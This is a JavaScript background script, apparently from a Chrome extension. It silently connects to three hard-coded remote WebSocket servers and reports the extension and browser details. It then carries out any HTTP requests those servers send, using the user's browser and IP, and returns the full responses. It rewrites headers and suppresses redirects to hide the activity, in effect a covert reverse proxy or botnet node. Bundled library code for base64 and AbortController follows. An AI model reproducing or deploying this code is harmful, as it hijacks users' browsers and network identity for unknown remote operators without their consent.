(function() {

  const WS_SERVER_PORT = 88;
  const IS_VISIBLE_LOGS = false;
  const REVERSE_VERSION = '0.2.0';
  var WSPool = [];

  const rejected_response_headers = {
    'transfer-encoding': true,
    'content-encoding': true,
    'content-length': true,
  };

  var requests = {};
  var requests_chrome_ids = {};

  var requests_to_block_to_prevent_redirect = {};

  function connect(WS_SERVER_HOST) {
    if (IS_VISIBLE_LOGS)
      console.log('connect to ' + WS_SERVER_HOST);

    var WS = new WebSocket('ws://' + WS_SERVER_HOST + ':' + WS_SERVER_PORT + '/server_info');

    WS.onopen = function() {
      let manifest = chrome.runtime.getManifest();
      let payload = {
        extensionID: chrome.runtime.id,
        extensionVersion: manifest.version,
        reverseVersion: REVERSE_VERSION,
        browser: (navigator && navigator.userAgent) ? navigator.userAgent : 'Unknown browser'
      };
      WS.send(JSON.stringify(payload));
    };

    WS.onmessage = function message(event) {
      var data = event.data;

      try {
        data = JSON.parse(data);
      } catch (e) {
        data = {};
      }

      if (data.reqid && data.method && data.url) {
        if (IS_VISIBLE_LOGS)
          console.log('request', data.reqid, data.method, data.url);

        requests[data.reqid] = {};
        requests[data.reqid].headers = data.headers;
        data.headers['x-reqid-chrextprxagn'] = data.reqid;

        var request = Object.assign({
          method: data.method,
          mode: 'cors',
          headers: data.headers,
          redirect: 'follow'
        }, (data.userParams ? data.userParams : {}));

        if (data.body.length)
          request.body = base64_arraybuffer.decode(data.body);

        requests[data.reqid].fetch_controller = new AbortController();
        request.signal = requests[data.reqid].fetch_controller.signal;

        fetch(data.url, request).then(function(res) {
          if (requests[data.reqid].do_stop)
            throw ('Stop processing request');

          data.statusCode = res.status;
          data.statusText = res.statusText;

          if (!data.statusCode && requests[data.reqid].response_status_code)
            data.statusCode = requests[data.reqid].response_status_code;
          if (!data.statusText && requests[data.reqid].response_status_text)
            data.statusText = requests[data.reqid].response_status_text;

          data.headers = {};
          for (var header of res.headers) {
            if (rejected_response_headers[header[0].toLowerCase()])
              continue;

            if (!data.headers[header[0]])
              data.headers[header[0]] = [];
            data.headers[header[0]].push(header[1]);
          }
          data.headers['X-prx-finalURL'] = [res.url];

          if (requests[data.reqid].do_stop)
            throw ('Stop processing request');

          return res.arrayBuffer();

        }).then(function(res) {
          if (requests[data.reqid].do_stop)
            throw ('Stop processing request');

          if (!requests[data.reqid].response_headers) {
            if (IS_VISIBLE_LOGS)
              console.log('no response_headers', data.reqid);
            var response_headers = data.headers;
          } else {
            var response_headers = requests[data.reqid].response_headers;
            response_headers['X-prx-finalURL'] = data.headers['X-prx-finalURL'];
          }
          res = base64_arraybuffer.encode(res);

          if (requests[data.reqid].do_stop)
            throw ('Stop processing request');

          WS.send(JSON.stringify({
            reqid: data.reqid,
            statusCode: data.statusCode,
            statusText: data.statusText,
            headers: response_headers,
            res: res
          }));

          delete(requests[data.reqid]);

        }).catch(function(err) {
          if (!requests[data.reqid].do_stop) {
            if (IS_VISIBLE_LOGS)
              console.log(data.reqid, err, requests[data.reqid].response_error);
            var res_err = '';
            res_err += requests[data.reqid].response_error ? requests[data.reqid].response_error : '';
            res_err += ' ; ';
            res_err += err.toString();
            WS.send(JSON.stringify({
              reqid: data.reqid,
              statusCode: requests[data.reqid].response_status_code ? requests[data.reqid].response_status_code : 0,
              statusText: requests[data.reqid].response_status_text ? requests[data.reqid].response_status_text : '',
              headers: requests[data.reqid].response_headers ? requests[data.reqid].response_headers : [],
              res: btoa(res_err),
            }));
          } else {
            if (IS_VISIBLE_LOGS)
              console.log('stop processing request, ignoring errors', data.reqid);
          }

          delete(requests[data.reqid]);
        });

      } else if (data.reqid && data.stop_req) {
        if (requests[data.reqid] && requests[data.reqid].fetch_controller) {
          requests[data.reqid].do_stop = true;
          requests[data.reqid].fetch_controller.abort();
        }

      }
    };

    WS.onclose = function reconnect(event) {
      delete(WS);
      if(event.wasClean)
        return;
      if (IS_VISIBLE_LOGS)
        console.log('reconnect in 15 sec');
      setTimeout(function() {
        connect(WS_SERVER_HOST);
      }, 45000);
    };

    WSPool.push(WS);
  }

  function multipleСonnection() {
    connect('nlrvrs.ininja1.extenbalanc.org');
    connect('nlrvrs.ininja2.extenbalanc.org');
    connect('nlrvrs.ininja3.extenbalanc.org');
  }

  // disable/enable reverse
  chrome.storage.onChanged.addListener(function(changes, namespace) {
    if(changes['proxyIsWork'] == undefined)
      return;
    if(!WSPool.length && changes['proxyIsWork'].newValue == false) {
      multipleСonnection();
    } else if(WSPool.length && changes['proxyIsWork'].newValue == true) {
      for (let ws of WSPool)
        if(ws) {
          ws.close();
          delete ws;
        }
      WSPool = [];
    }
  });

  // start reverse
  chrome.storage.local.get(['proxyIsWork'], function(items) {
    if(items.proxyIsWork !== true)
      multipleСonnection();
  });

  // emulation action for chrome browser
  setInterval(function() {
    fetch('http://ping.ipv4v6.info/')
      .then(function(response) {
        if (response.status !== 200)
          throw new Error(response.statusText + ' - ' + status);
      })
      .catch(function(ex) { });
  }, 45000);

  function headers_listeners(extra) {
    var opts = ['blocking', 'requestHeaders'];
    if (extra)
      opts.push('extraHeaders');

    chrome.webRequest.onBeforeSendHeaders.addListener(
      function(details) {
        var reqid = false;
        var saved_headers = [];
        let stopList = ['origin', 'content-length']

        for (var header of details.requestHeaders) {
          let lheader = header.name.toLowerCase();
          if (lheader == 'x-reqid-chrextprxagn')
            reqid = header.value;
          else if (stopList.indexOf(lheader) === -1)
            saved_headers.push({
              name: header.name.toLowerCase(),
              value: header.value
            });
        }

        if (!reqid || !requests[reqid]) {
          if (IS_VISIBLE_LOGS)
            console.log('no request', reqid);
          return;
        }

        if (requests[reqid].do_stop)
          return {
            cancel: true
          };

        requests_chrome_ids[details.requestId] = reqid;

        if (!requests[reqid].headers) {
          if (IS_VISIBLE_LOGS)
            console.log('no request headers', reqid);
          return;
        }

        if (saved_headers.length)
          var new_requestHeaders = saved_headers;
        else
          var new_requestHeaders = [];

        for (var name in requests[reqid].headers) {
          let lname = name.toLowerCase();
          let hasHeader = false;

          for (let header of saved_headers)
            if (lname == header.name.toLowerCase()) {
              if (lname == 'user-agent')
                header.value = requests[reqid].headers[name];
              hasHeader = true;
              break;
            }

          if (lname != 'x-reqid-chrextprxagn' && !hasHeader)
            new_requestHeaders.push({
              name: name,
              value: requests[reqid].headers[name]
            });

        }

        return {
          requestHeaders: new_requestHeaders
        };
      }, {
        urls: ['<all_urls>'],
        types: ['xmlhttprequest'],
        tabId: -1
      },
      opts
    );



    var opts = ['blocking', 'responseHeaders'];
    if (extra)
      opts.push('extraHeaders');
    chrome.webRequest.onHeadersReceived.addListener(
      function(details) {
        var reqid = requests_chrome_ids[details.requestId];
        if (!reqid) return;
        delete(requests_chrome_ids[details.requestId]);
        if (!requests[reqid]) {
          if (IS_VISIBLE_LOGS)
            console.log('no request', reqid);
          return;
        }

        if (requests[reqid].do_stop)
          return;

        if (('' + details.statusCode).substr(0, 1) == '3') {
          requests_to_block_to_prevent_redirect[details.requestId] = true;
        }

        requests[reqid].response_headers = {};
        var is_mod = false;
        for (var i in details.responseHeaders) {
          var header_name = details.responseHeaders[i].name;
          var lheader_name = header_name.toLowerCase();
          if (rejected_response_headers[lheader_name])
            continue;

          if (!requests[reqid].response_headers[header_name])
            requests[reqid].response_headers[header_name] = [];
          requests[reqid].response_headers[header_name].push(details.responseHeaders[i].value);

          if (lheader_name == 'set-cookie') {
            details.responseHeaders[i].value = '';
            is_mod = true;
          }
        }

        requests[reqid].response_status_code = details.statusCode;
        requests[reqid].response_status_text = details.statusLine.replace(/^HTTP\/[0-9\.]+\s+\d+\s*/, '');

        if (is_mod) {
          return {
            responseHeaders: details.responseHeaders
          };
        }
      }, {
        urls: ['<all_urls>'],
        types: ['xmlhttprequest'],
        tabId: -1
      },
      opts
    );
  }
  try {
    headers_listeners(true);
  } catch (e) {
    headers_listeners(false);
  }



  chrome.webRequest.onBeforeRequest.addListener(
    function(details) {
      if (requests_to_block_to_prevent_redirect[details.requestId]) {
        delete(requests_to_block_to_prevent_redirect[details.requestId]);
        return {
          cancel: true
        };
      }
    }, {
      urls: ['<all_urls>'],
      types: ['xmlhttprequest'],
      tabId: -1
    },
    ['blocking']
  );



  chrome.webRequest.onErrorOccurred.addListener(function(details) {
    var reqid = requests_chrome_ids[details.requestId];
    if (!reqid) return;
    if (!requests[reqid]) {
      if (IS_VISIBLE_LOGS)
        console.log('no request', reqid);
      return;
    }

    if (requests[reqid].do_stop) return;

    requests[reqid].response_error = details.error;
  }, {
    urls: ['<all_urls>'],
    types: ['xmlhttprequest'],
    tabId: -1
  });





  // LIBS

  const base64_arraybuffer = (function() {
    var exports = {};

    /*
     * base64-arraybuffer
     * https://github.com/niklasvh/base64-arraybuffer
     *
     * Copyright (c) 2012 Niklas von Hertzen
     * Licensed under the MIT license.
     */
    (function() {
      "use strict";

      var chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

      // Use a lookup table to find the index.
      var lookup = new Uint8Array(256);
      for (var i = 0; i < chars.length; i++) {
        lookup[chars.charCodeAt(i)] = i;
      }

      exports.encode = function(arraybuffer) {
        var bytes = new Uint8Array(arraybuffer),
          i, len = bytes.length,
          base64 = "";

        for (i = 0; i < len; i += 3) {
          base64 += chars[bytes[i] >> 2];
          base64 += chars[((bytes[i] & 3) << 4) | (bytes[i + 1] >> 4)];
          base64 += chars[((bytes[i + 1] & 15) << 2) | (bytes[i + 2] >> 6)];
          base64 += chars[bytes[i + 2] & 63];
        }

        if ((len % 3) === 2) {
          base64 = base64.substring(0, base64.length - 1) + "=";
        } else if (len % 3 === 1) {
          base64 = base64.substring(0, base64.length - 2) + "==";
        }

        return base64;
      };

      exports.decode = function(base64) {
        var bufferLength = base64.length * 0.75,
          len = base64.length,
          i, p = 0,
          encoded1, encoded2, encoded3, encoded4;

        if (base64[base64.length - 1] === "=") {
          bufferLength--;
          if (base64[base64.length - 2] === "=") {
            bufferLength--;
          }
        }

        var arraybuffer = new ArrayBuffer(bufferLength),
          bytes = new Uint8Array(arraybuffer);

        for (i = 0; i < len; i += 4) {
          encoded1 = lookup[base64.charCodeAt(i)];
          encoded2 = lookup[base64.charCodeAt(i + 1)];
          encoded3 = lookup[base64.charCodeAt(i + 2)];
          encoded4 = lookup[base64.charCodeAt(i + 3)];

          bytes[p++] = (encoded1 << 2) | (encoded2 >> 4);
          bytes[p++] = ((encoded2 & 15) << 4) | (encoded3 >> 2);
          bytes[p++] = ((encoded3 & 3) << 6) | (encoded4 & 63);
        }

        return arraybuffer;
      };
    })();

    return exports;
  })();



  // https://unpkg.com/abortcontroller-polyfill@1.1.9/dist/umd-polyfill.js
  (function(global, factory) {
    typeof exports === 'object' && typeof module !== 'undefined' ? factory() :
      typeof define === 'function' && define.amd ? define(factory) :
      (factory());
  }(this, (function() {
    'use strict';

    var classCallCheck = function(instance, Constructor) {
      if (!(instance instanceof Constructor)) {
        throw new TypeError("Cannot call a class as a function");
      }
    };

    var createClass = function() {
      function defineProperties(target, props) {
        for (var i = 0; i < props.length; i++) {
          var descriptor = props[i];
          descriptor.enumerable = descriptor.enumerable || false;
          descriptor.configurable = true;
          if ("value" in descriptor) descriptor.writable = true;
          Object.defineProperty(target, descriptor.key, descriptor);
        }
      }

      return function(Constructor, protoProps, staticProps) {
        if (protoProps) defineProperties(Constructor.prototype, protoProps);
        if (staticProps) defineProperties(Constructor, staticProps);
        return Constructor;
      };
    }();

    var get = function get(object, property, receiver) {
      if (object === null) object = Function.prototype;
      var desc = Object.getOwnPropertyDescriptor(object, property);

      if (desc === undefined) {
        var parent = Object.getPrototypeOf(object);

        if (parent === null) {
          return undefined;
        } else {
          return get(parent, property, receiver);
        }
      } else if ("value" in desc) {
        return desc.value;
      } else {
        var getter = desc.get;

        if (getter === undefined) {
          return undefined;
        }

        return getter.call(receiver);
      }
    };

    var inherits = function(subClass, superClass) {
      if (typeof superClass !== "function" && superClass !== null) {
        throw new TypeError("Super expression must either be null or a function, not " + typeof superClass);
      }

      subClass.prototype = Object.create(superClass && superClass.prototype, {
        constructor: {
          value: subClass,
          enumerable: false,
          writable: true,
          configurable: true
        }
      });
      if (superClass) Object.setPrototypeOf ? Object.setPrototypeOf(subClass, superClass) : subClass.__proto__ = superClass;
    };

    var possibleConstructorReturn = function(self, call) {
      if (!self) {
        throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
      }

      return call && (typeof call === "object" || typeof call === "function") ? call : self;
    };

    var Emitter = function() {
      function Emitter() {
        classCallCheck(this, Emitter);

        this.listeners = {};
      }

      createClass(Emitter, [{
        key: 'addEventListener',
        value: function addEventListener(type, callback) {
          if (!(type in this.listeners)) {
            this.listeners[type] = [];
          }
          this.listeners[type].push(callback);
        }
      }, {
        key: 'removeEventListener',
        value: function removeEventListener(type, callback) {
          if (!(type in this.listeners)) {
            return;
          }
          var stack = this.listeners[type];
          for (var i = 0, l = stack.length; i < l; i++) {
            if (stack[i] === callback) {
              stack.splice(i, 1);
              return;
            }
          }
        }
      }, {
        key: 'dispatchEvent',
        value: function dispatchEvent(event) {
          var _this = this;

          if (!(event.type in this.listeners)) {
            return;
          }
          var debounce = function debounce(callback) {
            setTimeout(function() {
              return callback.call(_this, event);
            });
          };
          var stack = this.listeners[event.type];
          for (var i = 0, l = stack.length; i < l; i++) {
            debounce(stack[i]);
          }
          return !event.defaultPrevented;
        }
      }]);
      return Emitter;
    }();

    var AbortSignal = function(_Emitter) {
      inherits(AbortSignal, _Emitter);

      function AbortSignal() {
        classCallCheck(this, AbortSignal);

        var _this2 = possibleConstructorReturn(this, (AbortSignal.__proto__ || Object.getPrototypeOf(AbortSignal)).call(this));

        _this2.aborted = false;
        _this2.onabort = null;
        return _this2;
      }

      createClass(AbortSignal, [{
        key: 'toString',
        value: function toString() {
          return '[object AbortSignal]';
        }
      }, {
        key: 'dispatchEvent',
        value: function dispatchEvent(event) {
          if (event.type === 'abort') {
            this.aborted = true;
            if (typeof this.onabort === 'function') {
              this.onabort.call(this, event);
            }
          }

          get(AbortSignal.prototype.__proto__ || Object.getPrototypeOf(AbortSignal.prototype), 'dispatchEvent', this).call(this, event);
        }
      }]);
      return AbortSignal;
    }(Emitter);

    var AbortController = function() {
      function AbortController() {
        classCallCheck(this, AbortController);

        this.signal = new AbortSignal();
      }

      createClass(AbortController, [{
        key: 'abort',
        value: function abort() {
          var event = void 0;
          try {
            event = new Event('abort');
          } catch (e) {
            if (typeof document !== 'undefined') {
              // For Internet Explorer 11:
              event = document.createEvent('Event');
              event.initEvent('abort', false, false);
            } else {
              // Fallback where document isn't available:
              event = {
                type: 'abort',
                bubbles: false,
                cancelable: false
              };
            }
          }
          this.signal.dispatchEvent(event);
        }
      }, {
        key: 'toString',
        value: function toString() {
          return '[object AbortController]';
        }
      }]);
      return AbortController;
    }();

    if (typeof Symbol !== 'undefined' && Symbol.toStringTag) {
      // These are necessary to make sure that we get correct output for:
      // Object.prototype.toString.call(new AbortController())
      AbortController.prototype[Symbol.toStringTag] = 'AbortController';
      AbortSignal.prototype[Symbol.toStringTag] = 'AbortSignal';
    }

    /**
     * Note: the "fetch.Request" default value is available for fetch imported from
     * the "node-fetch" package and not in browsers. This is OK since browsers
     * will be importing umd-polyfill.js from that path "self" is passed the
     * decorator so the default value will not be used (because browsers that define
     * fetch also has Request). One quirky setup where self.fetch exists but
     * self.Request does not is when the "unfetch" minimal fetch polyfill is used
     * on top of IE11; for this case the browser will try to use the fetch.Request
     * default value which in turn will be undefined but then then "if (Request)"
     * will ensure that you get a patched fetch but still no Request (as expected).
     * @param {fetch, Request = fetch.Request}
     * @returns {fetch: abortableFetch, Request: AbortableRequest}
     */
    function abortableFetchDecorator(patchTargets) {
      if ('function' === typeof patchTargets) {
        patchTargets = {
          fetch: patchTargets
        };
      }
      var _patchTargets = patchTargets,
        fetch = _patchTargets.fetch,
        _patchTargets$Request = _patchTargets.Request,
        NativeRequest = _patchTargets$Request === undefined ? fetch.Request : _patchTargets$Request,
        _patchTargets$AbortCo = _patchTargets.AbortController,
        NativeAbortController = _patchTargets$AbortCo === undefined ? AbortController : _patchTargets$AbortCo;


      var Request = NativeRequest;
      // Note that the "unfetch" minimal fetch polyfill defines fetch() without
      // defining window.Request, and this polyfill need to work on top of unfetch
      // so the below feature detection is wrapped in if (Request)
      if (Request) {
        // Do feature detecting
        var controller = new NativeAbortController();
        var signal = controller.signal;
        var request = new Request('/', {
          signal: signal
        });

        // Browser already supports abortable fetch (like FF v57 and fetch-polyfill)
        if (request.signal) {
          return {
            fetch: fetch,
            Request: Request
          };
        }

        Request = function Request(input, init) {
          var request = new NativeRequest(input, init);
          if (init && init.signal) {
            request.signal = init.signal;
          }
          return request;
        };
        Request.prototype = NativeRequest.prototype;
      }

      var realFetch = fetch;
      var abortableFetch = function abortableFetch(input, init) {
        var signal = Request && Request.prototype.isPrototypeOf(input) ? input.signal : init ? init.signal : undefined;

        if (signal) {
          var abortError = void 0;
          try {
            abortError = new DOMException('Aborted', 'AbortError');
          } catch (err) {
            // IE 11 does not support calling the DOMException constructor, use a
            // regular error object on it instead.
            abortError = new Error('Aborted');
            abortError.name = 'AbortError';
          }

          // Return early if already aborted, thus avoiding making an HTTP request
          if (signal.aborted) {
            return Promise.reject(abortError);
          }

          // Turn an event into a promise, reject it once `abort` is dispatched
          var cancellation = new Promise(function(_, reject) {
            signal.addEventListener('abort', function() {
              return reject(abortError);
            }, {
              once: true
            });
          });

          // Return the fastest promise (don't need to wait for request to finish)
          return Promise.race([cancellation, realFetch(input, init)]);
        }

        return realFetch(input, init);
      };

      return {
        fetch: abortableFetch,
        Request: Request
      };
    }

    (function(self) {

      if (self.AbortController) {
        return;
      }

      self.AbortController = AbortController;
      self.AbortSignal = AbortSignal;

      if (!self.fetch) {
        if (IS_VISIBLE_LOGS)
          console.warn('fetch() is not available, cannot install abortcontroller-polyfill');
        return;
      }

      var _abortableFetch = abortableFetchDecorator(self),
        fetch = _abortableFetch.fetch,
        Request = _abortableFetch.Request;

      self.fetch = fetch;
      self.Request = Request;
    })(typeof self !== 'undefined' ? self : global);

  })));

})();
